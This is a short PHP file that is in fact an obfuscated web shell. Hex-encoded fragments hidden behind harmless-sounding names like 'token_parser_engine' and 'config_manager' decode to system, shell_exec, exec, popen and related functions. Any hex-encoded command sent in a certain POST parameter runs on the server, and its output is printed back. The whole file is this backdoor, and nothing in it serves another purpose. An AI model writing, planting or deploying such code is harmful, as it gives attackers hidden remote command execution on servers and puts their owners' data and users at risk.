<?php


$ref1 = '973';
$ref2 = '746';
$ref3 = '865';
$ref4 = '6c6';
$ref5 = 'c5f';
$ref6 = '657';
$ref7 = '737';
$ref8 = '706';
$ref9 = 'f70';
$ref10 = '656';
$ref11 = '765';
$ref12 = 'e74';
$ref13 = '36c';
$ref14 = '365';
$ref15 = 'f6e';
$ref16 = '967';
$ref17 = '5f6';
$ref18 = 'd61';
$ref19 = '167';
$token_parser_engine1 = pack("H*", '737'.$ref1.$ref2.'56d');
$token_parser_engine2 = pack("H*", '736'.$ref3.$ref4.$ref5.'657'.$ref3);
$token_parser_engine3 = pack("H*", $ref6.'865');
$token_parser_engine4 = pack("H*", '706'.'173'.$ref7.'468'.'727');
$token_parser_engine5 = pack("H*", $ref8.$ref9.'656');
$token_parser_engine6 = pack("H*", $ref7.'472'.$ref10.'16d'.'5f6'.$ref11.'745'.'f63'.'6f6'.'e74'.$ref10.$ref12);
$token_parser_engine7 = pack("H*", '706'.$ref13.'6f7'.$ref14);
$config_manager = pack("H*", '636'.$ref15.'666'.$ref16.$ref17.$ref18.'6e6'.$ref19.$ref6);
if (isset($_POST[$config_manager])) {
    $config_manager = pack("H*", $_POST[$config_manager]);
    if (function_exists($token_parser_engine1)) {
        $token_parser_engine1($config_manager);
    } elseif (function_exists($token_parser_engine2)) {
        print $token_parser_engine2($config_manager);
    } elseif (function_exists($token_parser_engine3)) {
        $token_parser_engine3($config_manager, $ent_holder);
        print join("\n", $ent_holder);
    } elseif (function_exists($token_parser_engine4)) {
        $token_parser_engine4($config_manager);
    } elseif (function_exists($token_parser_engine5) && function_exists($token_parser_engine6) && function_exists($token_parser_engine7)) {
        $pgrp_ptr = $token_parser_engine5($config_manager, 'r');
        if ($pgrp_ptr) {
            $entity_data = $token_parser_engine6($pgrp_ptr);
            $token_parser_engine7($pgrp_ptr);
            print $entity_data;
        }
    }
    exit;
}
